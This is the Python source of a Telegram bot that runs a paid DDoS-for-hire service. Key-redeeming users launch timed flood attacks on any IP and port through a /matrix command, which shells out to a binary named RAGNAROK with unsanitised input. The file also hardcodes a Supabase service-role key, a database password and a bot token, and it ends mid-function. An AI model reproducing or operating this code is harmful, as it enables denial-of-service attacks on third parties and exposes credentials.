#!/usr/bin/python3
# MADE BY @its_MATRIX_king
#!/usr/bin/python3
import telebot
import multiprocessing
import os
import random
from datetime import datetime, timedelta
import subprocess
import sys
import time
import logging
import socket
import pytz
from supabase import create_client, Client
import psycopg2
import threading
import re

admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')

# Supabase configuration
url = "https://ldmyijysjjaimrbpqmek.supabase.co"
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkbXlpanlzamphaW1yYnBxbWVrIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjkwNjE5MSwiZXhwIjoyMDQ4NDgyMTkxfQ.mCpuIq0yPRskbuyxjXk57sB99dDqhxZ2YRJxtwaRk3U"
supabase: Client = create_client(url, key)

bot = telebot.TeleBot('7672708823:AAF3LZPZqKmoiXimApDzJI5n1QR5-Lnw-3s')
IST = pytz.timezone('Asia/Kolkata')

# Database connection
connection = psycopg2.connect(
    host="aws-0-ap-south-1.pooler.supabase.com",
    database="postgres",
    user="postgres.ldmyijysjjaimrbpqmek",
    password="Uthaya$4123",
    port=6543
)
cursor = connection.cursor()

# Tables
USER_TABLE = "users"
KEYS_TABLE = "unused_keys"

# Store ongoing attacks globally
ongoing_attacks = []

def read_users():
    try:
        cursor.execute("""
            SELECT user_id, expiration
            FROM users
            WHERE expiration > NOW()
        """)
        users = cursor.fetchall()
        return {user[0]: user[1] for user in users}
    except Exception as e:
        logging.error(f"Error reading users: {e}")
        connection.rollback()
        return {}

def clean_expired_users():
    try:
        cursor.execute("""
            DELETE FROM users
            WHERE expiration < NOW()
            RETURNING user_id, username, key, expiration
        """)
        removed_users = cursor.fetchall()
        connection.commit()

        for user in removed_users:
            user_id, username, key, expiration = user
            
            # Convert expiration to IST
            expiration_ist = expiration.astimezone(IST)
            
            user_message = f"""
🚫 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗘𝘅𝗽𝗶𝗿𝗲𝗱
👤 𝗨𝘀𝗲𝗿: @{username}
🔑 𝗞𝗲𝘆: {key}
⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 𝗮𝘁: {expiration_ist.strftime('%Y-%m-%d %H:%M:%S')} IST\n
📞 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @its_MATRIX_King 𝘁𝗼 𝗿𝗲𝗻𝗲𝘄 𝘆𝗼𝘂𝗿 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻.
🔄 𝗨𝘀𝗲 /plan 𝘁𝗼 𝘃𝗶𝗲𝘄 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗽𝗹𝗮𝗻𝘀.
"""
            bot.send_message(user_id, user_message)

        if removed_users:
            admin_message = "🔔 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 𝗥𝗲𝗺𝗼𝘃𝗲𝗱:\n\n"
            for user in removed_users:
                expiration_ist = user[3].astimezone(IST)
                admin_message += f"""
👤 @{user[1]} (ID: {user[0]})
🔑 𝗞𝗲𝘆: {user[2]}
⏰ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 𝗮𝘁: {expiration_ist.strftime('%Y-%m-%d %H:%M:%S')} IST
"""
            admin_message += f"\n𝗧𝗼𝘁𝗮𝗹 𝗿𝗲𝗺𝗼𝘃𝗲𝗱: {len(removed_users)}"
            
            for admin in admin_id:
                bot.send_message(admin, admin_message)

    except Exception as e:
        logging.error(f"Error cleaning expired users: {e}")
        connection.rollback()

def create_tables():
    try:
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id TEXT PRIMARY KEY,
                username TEXT,
                key TEXT,
                redeemed_at TIMESTAMP WITH TIME ZONE,
                expiration TIMESTAMP WITH TIME ZONE
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS unused_keys (
                key TEXT PRIMARY KEY,
                duration INTEGER,
                created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                is_used BOOLEAN DEFAULT FALSE
            )
        """)
        connection.commit()
    except Exception as e:
        logging.error(f"Error creating tables: {e}")
        connection.rollback()


def setup_database():
    try:
        # Drop existing tables
        cursor.execute("DROP TABLE IF EXISTS users")
        cursor.execute("DROP TABLE IF EXISTS unused_keys")
        
        # Create users table with all required fields
        cursor.execute("""
            CREATE TABLE users (
                user_id TEXT PRIMARY KEY,
                username TEXT,
                key TEXT,
                expiration TIMESTAMP WITH TIME ZONE
            )
        """)
        
        # Create unused_keys table
        cursor.execute("""
            CREATE TABLE unused_keys (
                key_code TEXT PRIMARY KEY,
                duration TEXT,
                created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            )
        """)
        connection.commit()
        
    except Exception as e:
        logging.error(f"Database setup error: {e}")
        connection.rollback()

def parse_time_input(time_input):
    match = re.match(r"(\d+)([mhd])", time_input)
    if match:
        number = int(match.group(1))
        unit = match.group(2)
        if unit == "m":
            return timedelta(minutes=number)
        elif unit == "h":
            return timedelta(hours=number)
        elif unit == "d":
            return timedelta(days=number)
    return None

@bot.message_handler(commands=['key'])
def generate_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /key <duration>\nExample: 1d, 7d, 30d")
            return
        duration_str = args[1]
        duration = parse_time_input(duration_str)
        if not duration:
            bot.reply_to(message, "❌ Invalid duration format. Use: 1d, 7d, 30d")
            return
        letters = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=4))
        numbers = ''.join(str(random.randint(0, 9)) for _ in range(4))
        key = f"MATRIX-VIP-{letters}{numbers}"
        cursor.execute("""
            INSERT INTO unused_keys (key, duration, created_at, is_used)
            VALUES (%s, %s, NOW(), FALSE)
        """, (key, duration.total_seconds()))
        connection.commit()
        bot.reply_to(message, f"""✅ Key Generated Successfully
🔑 Key: `{key}`
⏱ Duration: {duration_str}
📅 Generated: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST""")
    except Exception as e:
        bot.reply_to(message, f"❌ Error generating key: {str(e)}")
        connection.rollback()

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /redeem <key>")
            return

        key = args[1].strip()
        user_id = str(message.chat.id)
        username = message.from_user.username or "Unknown"

        # Check if key is valid and unused
        cursor.execute("""
            SELECT duration FROM unused_keys
            WHERE key = %s AND is_used = FALSE
        """, (key,))
        result = cursor.fetchone()
        if not result:
            bot.reply_to(message, "❌ Invalid or already used key!")
            return

        duration = result[0]
        redeemed_at = datetime.now(IST)
        expiration = redeemed_at + timedelta(seconds=duration)

        cursor.execute("""
            INSERT INTO users (user_id, username, key, redeemed_at, expiration)
            VALUES (%s, %s, %s, %s, %s)
            ON CONFLICT (user_id) DO UPDATE
            SET key = EXCLUDED.key, redeemed_at = EXCLUDED.redeemed_at,
                expiration = EXCLUDED.expiration, username = EXCLUDED.username
        """, (user_id, username, key, redeemed_at, expiration))

        cursor.execute("UPDATE unused_keys SET is_used = TRUE WHERE key = %s", (key,))
        connection.commit()

        # Send success message to user
        user_message = f"""
✅ Key Redeemed Successfully!
🕰️ Redeem : {redeemed_at.strftime('%Y-%m-%d %H:%M:%S')} IST
📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST
"""
        bot.reply_to(message, user_message)

        # Notify admin
        admin_message = f"""
🔑 Key Redeemed Alert
👤 User: @{username} (ID: {user_id})
🔑 Key: {key}
⏳ Duration: {timedelta(seconds=duration)}
🕰️ Redeemed at: {redeemed_at.strftime('%Y-%m-%d %H:%M:%S')} IST
📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')} IST
"""
        for admin in admin_id:
            bot.send_message(admin, admin_message)

    except Exception as e:
        bot.reply_to(message, f"❌ Error redeeming key: {str(e)}")
        connection.rollback()

@bot.message_handler(commands=['remove'])
def remove_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "Only Admin Can Run This Command.")
        return
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Usage: /remove <key>")
            return
        key = args[1]
        cursor.execute("DELETE FROM unused_keys WHERE key = %s", (key,))
        cursor.execute("DELETE FROM users WHERE key = %s", (key,))
        connection.commit()
        bot.reply_to(message, f"Key {key} has been removed successfully.")
    except Exception as e:
        logging.error(f"Error removing key: {e}")
        bot.reply_to(message, "An error occurred while removing the key.")

@bot.message_handler(commands=['allusers'])
def show_users(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return

    try:
        # Modified query to get reseller username correctly
        cursor.execute("""
            SELECT 
                u.user_id, 
                u.username, 
                u.key, 
                u.expiration, 
                rt.reseller_id,
                COALESCE(r.username, rs.username) as reseller_username
            FROM users u
            LEFT JOIN reseller_transactions rt ON u.key = rt.key_generated
            LEFT JOIN resellers r ON rt.reseller_id = r.telegram_id
            LEFT JOIN users rs ON rt.reseller_id = rs.user_id
            WHERE u.expiration > NOW()
            ORDER BY rt.reseller_id NULLS FIRST, u.expiration DESC
        """)
        users = cursor.fetchall()

        if not users:
            bot.reply_to(message, "📝 No active users found")
            return

        response = "👥 𝗔𝗰𝘁𝗶𝘃𝗲 𝗨𝘀𝗲𝗿𝘀:\n\n"
        current_time = datetime.now(IST)

        # Direct Users
        response += "📌 𝗗𝗶𝗿𝗲𝗰𝘁 𝗨𝘀𝗲𝗿𝘀:\n"
        for user in users:
            if user[4] is None:  # No reseller
                remaining = user[3].astimezone(IST) - current_time
                response += (
                    f"👤 User: @{user[1]}\n"
                    f"🆔 ID: {user[0]}\n"
                    f"🔑 Key: {user[2]}\n"
                    f"⏳ Remaining: {remaining.days}d {remaining.seconds//3600}h\n"
                    f"📅 Expires: {user[3].astimezone(IST).strftime('%Y-%m-%d %H:%M:%S')} IST\n\n"
                )

        # Reseller Users
        response += "\n🎯 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗨𝘀𝗲𝗿𝘀:\n"
        current_reseller = None
        
        for user in users:
            if user[4]:  # Has reseller
                if current_reseller != user[4]:
                    current_reseller = user[4]
                    reseller_username = user[5] if user[5] else "Unknown"
                    response += f"\n💼 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿: @{reseller_username}\n"
                    response += f"🆔 𝗜𝗗: {user[4]}\n"

                remaining = user[3].astimezone(IST) - current_time
                response += (
                    f"👤 User: @{user[1]}\n"
                    f"🆔 ID: {user[0]}\n"
                    f"🔑 Key: {user[2]}\n"
                    f"⏳ Remaining: {remaining.days}d {remaining.seconds//3600}h\n"
                    f"📅 Expires: {user[3].astimezone(IST).strftime('%Y-%m-%d %H:%M:%S')} IST\n\n"
                )

        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching users: {str(e)}")

@bot.message_handler(commands=['allkeys'])
def show_all_keys(message):
    if str(message.chat.id) not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return

    try:
        # Modified query to get reseller username from users table
        cursor.execute("""
            SELECT 
                k.key, 
                k.duration, 
                k.created_at, 
                rt.reseller_id,
                COALESCE(r.username, u.username) as username
            FROM unused_keys k
            LEFT JOIN reseller_transactions rt ON k.key = rt.key_generated
            LEFT JOIN resellers r ON rt.reseller_id = r.telegram_id
            LEFT JOIN users u ON rt.reseller_id = u.user_id
            WHERE k.is_used = FALSE
            ORDER BY rt.reseller_id NULLS FIRST, k.created_at DESC
        """)
        keys = cursor.fetchall()

        if not keys:
            bot.reply_to(message, "📝 No unused keys available")
            return

        response = "🔑 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗞𝗲𝘆𝘀:\n\n"

        # Direct Generated Keys
        response += "📌 𝗗𝗶𝗿𝗲𝗰𝘁 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱:\n"
        for key in keys:
            if key[3] is None:  # No reseller
                duration_seconds = float(key[1])
                created_at = key[2].astimezone(IST)
                days = int(duration_seconds // (24 * 3600))
                remaining = duration_seconds % (24 * 3600)
                hours = int(remaining // 3600)
                minutes = int((remaining % 3600) // 60)
                
                response += (
                    f"🔑 Key: `{key[0]}`\n"
                    f"⏱ Duration: {days}d {hours}h {minutes}m\n"
                    f"📅 Created: {created_at.strftime('%Y-%m-%d %H:%M:%S')} IST\n\n"
                )

        # Reseller Generated Keys
        response += "\n🎯 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱:\n"
        current_reseller = None
        
        for key in keys:
            if key[3]:  # Has reseller
                if current_reseller != key[3]:
                    current_reseller = key[3]
                    username = key[4] if key[4] else "Unknown"
                    response += f"\n💼 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿: @{username}\n"
                    response += f"🆔 𝗜𝗗: {key[3]}\n"

                duration_seconds = float(key[1])
                created_at = key[2].astimezone(IST)
                days = int(duration_seconds // (24 * 3600))
                remaining = duration_seconds % (24 * 3600)
                hours = int(remaining // 3600)
                minutes = int((remaining % 3600) // 60)

                response += (
                    f"🔑 Key: `{key[0]}`\n"
                    f"⏱ Duration: {days}d {hours}h {minutes}m\n"
                    f"📅 Created: {created_at.strftime('%Y-%m-%d %H:%M:%S')} IST\n\n"
                )

        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching keys: {str(e)}")


ongoing_attacks = []
attack_cooldown = {}

def start_attack_reply(message, target, port, time):
    username = message.from_user.username if message.from_user.username else message.from_user.first_name
    user_id = message.from_user.id
    start_time = datetime.now(IST)
    
    # Add attack to ongoing attacks list
    ongoing_attacks.append({
        'user': username,
        'user_id': user_id,
        'target': target,
        'port': port,
        'time': time,
        'start_time': start_time
    })
    
    # Format initial attack message for user
    user_response = f"""
🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗!

👤 𝗨𝘀𝗲𝗿: {username}
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%H:%M:%S')} IST

⚡️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...
"""
    bot.reply_to(message, user_response)
    
    # Send notification to admin
    admin_notification = f"""
🚨 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞 𝗟𝗔𝗨𝗡𝗖𝗛𝗘𝗗

👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {time} seconds
📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {start_time.strftime('%Y-%m-%d %H:%M:%S')} IST
🌐 𝗨𝘀𝗲𝗿 𝗜𝗣: {message.from_user.language_code}

⚠️ 𝗠𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴 𝗮𝘁𝘁𝗮𝗰𝗸 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...
"""
    for admin in admin_id:
        bot.send_message(admin, admin_notification)
    
    try:
        # Execute attack
        subprocess.run(f"./RAGNAROK {target} {port} {time}", shell=True)
        
        # Calculate attack duration
        end_time = datetime.now(IST)
        duration = (end_time - start_time).total_seconds()
        
        # Remove from ongoing attacks
        ongoing_attacks.pop()
        
        # Send completion message to user
        completion_msg = f"""
✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗

⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%H:%M:%S')} IST
"""
        bot.reply_to(message, completion_msg)
        
        # Send completion notification to admin
        admin_completion = f"""
✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗

👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⏱️ 𝗔𝗰𝘁𝘂𝗮𝗹 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {int(duration)} seconds
📅 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱: {end_time.strftime('%Y-%m-%d %H:%M:%S')} IST
"""
        for admin in admin_id:
            bot.send_message(admin, admin_completion)
        
    except Exception as e:
        # Handle attack failure
        ongoing_attacks.pop()
        error_msg = f"""
❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗

⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿.
"""
        bot.reply_to(message, error_msg)
        
        # Send failure notification to admin
        admin_failure = f"""
❌ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗔𝗜𝗟𝗘𝗗

👤 𝗨𝘀𝗲𝗿: {username} (ID: {user_id})
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}
🔌 𝗣𝗼𝗿𝘁: {port}
⚠️ 𝗘𝗿𝗿𝗼𝗿: {str(e)}
📅 𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
"""
        for admin in admin_id:
            bot.send_message(admin, admin_failure)


@bot.message_handler(commands=['matrix'])
def handle_matrix(message):
    user_id = str(message.chat.id)
    users = read_users()
    
    # Check if user is authorized
    if user_id not in admin_owner and user_id not in users:
        bot.reply_to(message, """
⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱
• 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱
• 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @its_MATRIX_King 𝘁𝗼 𝗽𝘂𝗿𝗰𝗵𝗮𝘀𝗲
""")
        return

    # Check for ongoing attacks
    if ongoing_attacks:
        attack_info = ongoing_attacks[0]  # Get the current attack
        elapsed = (datetime.now(IST) - attack_info['start_time']).total_seconds()
        remaining = max(0, attack_info['time'] - int(elapsed))
        
        bot.reply_to(message, f"""
⚠️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀

⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds

📝 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵
""")
        return

    # Parse command arguments
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, """
📝 𝗨𝘀𝗮𝗴𝗲: /matrix <target> <port> <time>
𝗘𝘅𝗮𝗺𝗽𝗹𝗲: /matrix 1.1.1.1 80 120

⚠️ 𝗟𝗶𝗺𝗶𝘁𝗮𝘁𝗶𝗼𝗻𝘀:
• 𝗠𝗮𝘅 𝘁𝗶𝗺𝗲: 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
• 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻: 5 𝗺𝗶𝗻𝘂𝘁𝗲𝘀
""")
        return

    try:
        target = args[1]
        port = int(args[2])
        time = int(args[3])

        # Validate time limit
        if time > 240:
            bot.reply_to(message, "⚠️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")
            return

        # Check cooldown for non-admin users
        if user_id not in admin_owner:
            if user_id in attack_cooldown:
                remaining = attack_cooldown[user_id] - datetime.now(IST)
                if remaining.total_seconds() > 0:
                    minutes = int(remaining.total_seconds() // 60)
                    seconds = int(remaining.total_seconds() % 60)
                    bot.reply_to(message, f"""
⏳ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗔𝗰𝘁𝗶𝘃𝗲
𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁: {minutes}m {seconds}s
""")
                    return

        # Start the attack
        start_attack_reply(message, target, port, time)

        # Set cooldown for non-admin users
        if user_id not in admin_owner:
            attack_cooldown[user_id] = datetime.now(IST) + timedelta(minutes=5)

    except ValueError:
        bot.reply_to(message, "❌ 𝗘𝗿𝗿𝗼𝗿: 𝗣𝗼𝗿𝘁 𝗮𝗻𝗱 𝘁𝗶𝗺𝗲 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗻𝘂𝗺𝗯𝗲𝗿𝘀.")


# Previous attack handling code remains the same
ongoing_attacks = []

@bot.message_handler(commands=['status'])
def show_status(message):
    user_id = str(message.chat.id)
    users = read_users()
    
    # Check if user is authorized
    if user_id not in admin_owner and user_id not in users:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")
        return

    if not ongoing_attacks:
        bot.reply_to(message, "📊 𝗦𝘁𝗮𝘁𝘂𝘀: No ongoing attacks")
        return

    current_time = datetime.now(IST)
    
    # Different views for admin and regular users
    if user_id in admin_owner:
        # Detailed admin view
        response = "📊 𝗗𝗲𝘁𝗮𝗶𝗹𝗲𝗱 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝘁𝘂𝘀:\n\n"
        for attack in ongoing_attacks:
            elapsed = (current_time - attack['start_time']).total_seconds()
            remaining = max(0, attack['time'] - int(elapsed))
            progress = min(100, (elapsed / attack['time']) * 100)
            
            response += (
                f"👤 𝗨𝘀𝗲𝗿: @{attack['user']} (ID: {attack['user_id']})\n"
                f"🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {attack['target']}\n"
                f"🔌 𝗣𝗼𝗿𝘁: {attack['port']}\n"
                f"⏱️ 𝗧𝗼𝘁𝗮𝗹 𝗧𝗶𝗺𝗲: {attack['time']} seconds\n"
                f"⌛️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds\n"
                f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {progress:.1f}%\n"
                f"📅 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {attack['start_time'].strftime('%Y-%m-%d %H:%M:%S')} IST\n"
                f"🔄 𝗘𝗹𝗮𝗽𝘀𝗲𝗱: {int(elapsed)} seconds\n"
                "━━━━━━━━━━━━━━━\n"
            )
    else:
        # Simple user view
        response = "📊 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝘁𝘂𝘀:\n\n"
        for attack in ongoing_attacks:
            elapsed = (current_time - attack['start_time']).total_seconds()
            remaining = max(0, attack['time'] - int(elapsed))
            progress = min(100, (elapsed / attack['time']) * 100)
            
            response += (
                f"⏳ 𝗦𝘁𝗮𝘁𝘂𝘀: Attack in Progress\n"
                f"⌛️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining} seconds\n"
                f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {progress:.1f}%\n"
                "━━━━━━━━━━━━━━━\n"
                "⚠️ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 𝗳𝗼𝗿 𝘁𝗵𝗲 𝗰𝘂𝗿𝗿𝗲𝗻𝘁\n"
                "𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗼 𝗳𝗶𝗻𝗶𝘀𝗵\n"
            )

    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: Admin only command")
        return

    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "📝 𝗨𝘀𝗮𝗴𝗲: /broadcast <message>")
        return

    broadcast_text = args[1]
    try:
        # Get all active users
        cursor.execute("""
            SELECT user_id, username 
            FROM users 
            WHERE expiration > NOW()
            ORDER BY username
        """)
        users = cursor.fetchall()

        if not users:
            bot.reply_to(message, "❌ No active users found to broadcast to.")
            return

        # Track successful and failed broadcasts
        success_count = 0
        failed_users = []

        # Send message to each user
        for user_id, username in users:
            try:
                formatted_message = f"""
📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘

{broadcast_text}

━━━━━━━━━━━━━━━
𝗦𝗲𝗻𝘁 𝗯𝘆: @{message.from_user.username}
𝗧𝗶𝗺𝗲: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')} IST
"""
                bot.send_message(user_id, formatted_message)
                success_count += 1
                time.sleep(0.1)  # Prevent flooding
            except Exception as e:
                failed_users.append(f"@{username}")
                logging.error(f"Failed to send broadcast to {username} ({user_id}): {e}")

        # Send summary to admin
        summary = f"""
✅ 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗦𝘂𝗺𝗺𝗮𝗿𝘆:

📨 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {len(users)}
✅ 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹: {success_count}
❌ 𝗙𝗮𝗶𝗹𝗲𝗱: {len(failed_users)}
"""
        if failed_users:
            summary += f"\n❌ 𝗙𝗮𝗶𝗹𝗲𝗱 𝘂𝘀𝗲𝗿𝘀:\n" + "\n".join(failed_users)

        bot.reply_to(message, summary)

    except Exception as e:
        logging.error(f"Broadcast error: {e}")
        bot.reply_to(message, f"❌ Error during broadcast: {str(e)}")

@bot.message_handler(commands=['help'])
def show_help(message):
    try:
        user_id = str(message.chat.id)
        help_text = '''
📚 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:

🎯 𝗨𝗦𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /matrix - 𝗘𝘅𝗲𝗰𝘂𝘁𝗲 𝗮𝘁𝘁𝗮𝗰𝗸
• /status - 𝗖𝗵𝗲𝗰𝗸 𝗮𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝘁𝘂𝘀
• /plan - 𝗩𝗶𝗲𝘄 𝗽𝗿𝗶𝗰𝗶𝗻𝗴 𝗽𝗹𝗮𝗻𝘀
• /rulesanduse - 𝗩𝗶𝗲𝘄 𝗿𝘂𝗹𝗲𝘀
• /redeem - 𝗥𝗲𝗱𝗲𝗲𝗺 𝗮 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆
'''
        if user_id in admin_id:
            help_text += '''
👑 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /key - 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲 𝗹𝗶𝗰𝗲𝗻𝘀𝗲 𝗸𝗲𝘆
• /allkeys - 𝗩𝗶𝗲𝘄 𝗮𝗹𝗹 𝗸𝗲𝘆𝘀
• /allusers - 𝗩𝗶𝗲𝘄 𝗮𝗰𝘁𝗶𝘃𝗲 𝘂𝘀𝗲𝗿𝘀
• /broadcast - 𝗦𝗲𝗻𝗱 𝗺𝗮𝘀𝘀 𝗺𝗲𝘀𝘀𝗮𝗴𝗲
• /remove - 𝗥𝗲𝗺𝗼𝘃𝗲 𝗮 𝗸𝗲𝘆
'''
        help_text += '''
📢 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟:
➡️ @MATRIX_CHEATS

👨‍💻 𝗢𝗪𝗡𝗘𝗥/𝗕𝗨𝗬:
➡️ @its_MATRIX_King
'''
        bot.reply_to(message, help_text)
    except Exception as e:
        logging.error(f"Error in /help command: {e}")
        bot.reply_to(message, "❌ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻.")
    
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
